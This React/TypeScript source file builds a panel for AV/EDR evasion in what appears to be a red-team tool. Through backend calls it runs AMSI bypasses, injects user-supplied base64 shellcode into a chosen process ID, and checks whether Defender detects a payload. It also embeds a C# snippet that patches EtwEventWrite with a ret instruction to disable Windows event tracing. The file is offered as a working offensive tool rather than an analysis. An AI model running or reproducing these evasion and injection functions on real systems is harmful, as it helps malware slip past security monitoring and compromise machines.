import { useState, useCallback, useEffect } from 'react';

type EvadeTab = 'bypasses' | 'injection' | 'checker';

interface AmsiBypass {
  name: string;
  code: string;
  description: string;
}

interface InjectionTechnique {
  id: string;
  name: string;
  description: string;
}

export function EvadePanel() {
  const [tab, setTab] = useState<EvadeTab>('bypasses');
  const [bypasses, setBypasses] = useState<AmsiBypass[]>([]);
  const [techniques, setTechniques] = useState<InjectionTechnique[]>([]);
  const [selectedBypass, setSelectedBypass] = useState('');
  const [bypassOutput, setBypassOutput] = useState('');
  const [bypassRunning, setBypassRunning] = useState(false);

  // Injection
  const [targetPid, setTargetPid] = useState('');
  const [shellcodeB64, setShellcodeB64] = useState('');
  const [injectTechnique, setInjectTechnique] = useState('');
  const [injectOutput, setInjectOutput] = useState('');
  const [injectRunning, setInjectRunning] = useState(false);

  // File checker
  const [checkFilePath, setCheckFilePath] = useState('');
  const [checkResult, setCheckResult] = useState<{ detected: boolean; engines: number; result: string } | null>(null);
  const [checking, setChecking] = useState(false);
  const [etwOutput, setEtwOutput] = useState('');
  const [etwRunning, setEtwRunning] = useState(false);

  useEffect(() => {
    window.api.evasionGetBypasses().then(setBypasses).catch(() => {});
    window.api.evasionGetTechniques().then(setTechniques).catch(() => {});
  }, []);

  const handleRunBypass = useCallback(async () => {
    if (!selectedBypass) return;
    setBypassRunning(true);
    setBypassOutput('');
    try {
      const result = await window.api.evasionRunBypass(selectedBypass);
      setBypassOutput(result.output);
      await window.api.addActivity({ tab: 'evade', type: 'bypass', label: `AMSI bypass: ${selectedBypass}`, detail: result.success ? 'Success' : 'Failed' });
    } catch (err: any) {
      setBypassOutput(`Error: ${err.message}`);
    } finally {
      setBypassRunning(false);
    }
  }, [selectedBypass]);

  const handlePatchEtw = useCallback(async () => {
    setEtwRunning(true);
    setEtwOutput('');
    try {
      const result = await window.api.evasionPatchEtw();
      setEtwOutput(result.output);
      await window.api.addActivity({ tab: 'evade', type: 'etw', label: 'ETW patching', detail: result.success ? 'Success' : 'Failed' });
    } catch (err: any) {
      setEtwOutput(`Error: ${err.message}`);
    } finally {
      setEtwRunning(false);
    }
  }, []);

  const handleInject = useCallback(async () => {
    if (!targetPid || !shellcodeB64 || !injectTechnique) return;
    setInjectRunning(true);
    setInjectOutput('');
    try {
      const result = await window.api.evasionInject(parseInt(targetPid), shellcodeB64, injectTechnique);
      setInjectOutput(result.output);
      await window.api.addActivity({ tab: 'evade', type: 'inject', label: `Injected into PID ${targetPid}`, detail: `Technique: ${injectTechnique}` });
    } catch (err: any) {
      setInjectOutput(`Error: ${err.message}`);
    } finally {
      setInjectRunning(false);
    }
  }, [targetPid, shellcodeB64, injectTechnique]);

  const handleCheckFile = useCallback(async () => {
    if (!checkFilePath) return;
    setChecking(true);
    setCheckResult(null);
    try {
      const result = await window.api.evasionCheckFile(checkFilePath);
      setCheckResult(result);
    } catch (err: any) {
      setCheckResult({ detected: false, engines: 0, result: `Error: ${err.message}` });
    } finally {
      setChecking(false);
    }
  }, [checkFilePath]);

  return (
    <div className="space-y-4">
      <div className="card border-redhawk-700/30">
        <div className="flex items-center gap-2 mb-2">
          <span className="text-lg">🛡️</span>
          <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">AV / EDR Evasion</h2>
        </div>
        <p className="text-xs text-gray-500">AMSI bypasses, ETW patching, process injection, and Defender testing.</p>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 bg-midnight-900 rounded-lg p-1 border border-midnight-800">
        {[
          { id: 'bypasses' as const, label: 'AMSI & ETW', icon: '🛡️' },
          { id: 'injection' as const, label: 'Injection', icon: '💉' },
          { id: 'checker' as const, label: 'Defender Check', icon: '🔬' },
        ].map((t) => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className={`flex-1 py-2 rounded-md text-xs font-medium transition-all ${
              tab === t.id ? 'bg-redhawk-600/20 text-white border border-redhawk-600/30' : 'text-gray-500 hover:text-gray-300'
            }`}>{t.icon} {t.label}</button>
        ))}
      </div>

      {/* ── AMSI & ETW ── */}
      {tab === 'bypasses' && (
        <div className="space-y-3">
          <div className="card">
            <div className="card-header">AMSI Bypass</div>
            <select value={selectedBypass} onChange={(e) => setSelectedBypass(e.target.value)}
              className="input-field py-1.5 text-sm mb-2">
              <option value="" className="bg-midnight-900 text-gray-100">Select a bypass technique...</option>
              {bypasses.map((b) => (
                <option key={b.name} value={b.name} className="bg-midnight-900 text-gray-100">{b.name} — {b.description}</option>
              ))}
            </select>
            {selectedBypass && bypasses.find(b => b.name === selectedBypass) && (
              <div className="bg-midnight-950/60 rounded-lg p-2 mb-2">
                <pre className="text-[10px] text-gray-400 whitespace-pre-wrap max-h-24 overflow-y-auto">
                  {bypasses.find(b => b.name === selectedBypass)?.code}
                </pre>
              </div>
            )}
            <button onClick={handleRunBypass} disabled={bypassRunning || !selectedBypass}
              className="btn-primary w-full text-xs">{bypassRunning ? 'Running...' : 'Execute Bypass'}</button>
            {bypassOutput && <pre className="terminal text-[10px] mt-2 max-h-32 overflow-y-auto">{bypassOutput}</pre>}
          </div>

          <div className="card">
            <div className="card-header">ETW Patching</div>
            <p className="text-xs text-gray-500 mb-2">Patch the EtwEventWrite function to disable ETW for the current process.</p>
            <div className="bg-midnight-950/60 rounded-lg p-2 mb-2">
              <pre className="text-[10px] text-gray-400 whitespace-pre-wrap">{`// C# — patch EtwEventWrite with ret (0xC3)
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
var ntdll = GetModuleHandle("ntdll.dll");
var etw = GetProcAddress(ntdll, "EtwEventWrite");
// Write ret (0xC3) at the start
byte[] patch = { 0xC3 };
VirtualProtect(etw, patch.Length, 0x40, out _);
Marshal.Copy(patch, 0, etw, patch.Length);`}</pre>
            </div>
            <button onClick={handlePatchEtw} disabled={etwRunning}
              className="btn-secondary w-full text-xs">{etwRunning ? 'Patching...' : 'Patch ETW'}</button>
            {etwOutput && <pre className="terminal text-[10px] mt-2 max-h-32 overflow-y-auto">{etwOutput}</pre>}
          </div>
        </div>
      )}

      {/* ── Injection ── */}
      {tab === 'injection' && (
        <div className="card">
          <div className="card-header">Process Injection</div>
          <div className="grid grid-cols-3 gap-3 mb-3">
            <div>
              <label className="text-[10px] text-gray-500 block mb-1">Target PID</label>
              <input type="text" value={targetPid} onChange={(e) => setTargetPid(e.target.value)}
                className="input-field h-9 text-sm font-mono" placeholder="e.g. 1234" />
            </div>
            <div className="col-span-2">
              <label className="text-[10px] text-gray-500 block mb-1">Technique</label>
              <select value={injectTechnique} onChange={(e) => setInjectTechnique(e.target.value)}
                className="input-field py-1.5 text-sm">
                <option value="" className="bg-midnight-900 text-gray-100">Select technique...</option>
                {techniques.map((t) => (
                  <option key={t.id} value={t.id} className="bg-midnight-900 text-gray-100">{t.name} — {t.description}</option>
                ))}
              </select>
            </div>
          </div>
          <div className="mb-3">
            <label className="text-[10px] text-gray-500 block mb-1">Shellcode (Base64)</label>
            <textarea value={shellcodeB64} onChange={(e) => setShellcodeB64(e.target.value)}
              className="input-field h-20 text-[10px] font-mono" placeholder="Paste your base64-encoded shellcode here..." />
          </div>
          <button onClick={handleInject} disabled={injectRunning || !targetPid || !shellcodeB64 || !injectTechnique}
            className="btn-primary w-full text-xs">{injectRunning ? 'Injecting...' : 'Inject'}</button>
          {injectOutput && <pre className="terminal text-[10px] mt-2 max-h-32 overflow-y-auto">{injectOutput}</pre>}
        </div>
      )}

      {/* ── Defender Check ── */}
      {tab === 'checker' && (
        <div className="card">
          <div className="card-header">Defender / AV Check</div>
          <p className="text-xs text-gray-500 mb-3">Upload a file path to check if Defender detects it. Enter the full path to the payload.</p>
          <div className="flex gap-2">
            <input type="text" value={checkFilePath} onChange={(e) => setCheckFilePath(e.target.value)}
              className="input-field h-9 text-sm font-mono flex-1" placeholder="C:\path\to\payload.exe" />
            <button onClick={handleCheckFile} disabled={checking || !checkFilePath}
              className="btn-primary text-xs whitespace-nowrap">{checking ? 'Checking...' : 'Check'}</button>
          </div>
          {checkResult && (
            <div className={`mt-3 p-3 rounded-lg text-xs ${
              checkResult.detected ? 'bg-red-900/20 border border-red-700/30 text-red-400'
                : 'bg-green-900/20 border border-green-700/30 text-green-400'
            }`}>
              <p className="font-medium mb-1">{checkResult.detected ? '⚠️ Detected' : '✅ Not detected'}</p>
              <p className="text-gray-400">{checkResult.engines > 0 ? `${checkResult.engines} engines flagged it` : 'No engines flagged'}</p>
              <pre className="text-[10px] text-gray-500 mt-1">{checkResult.result}</pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
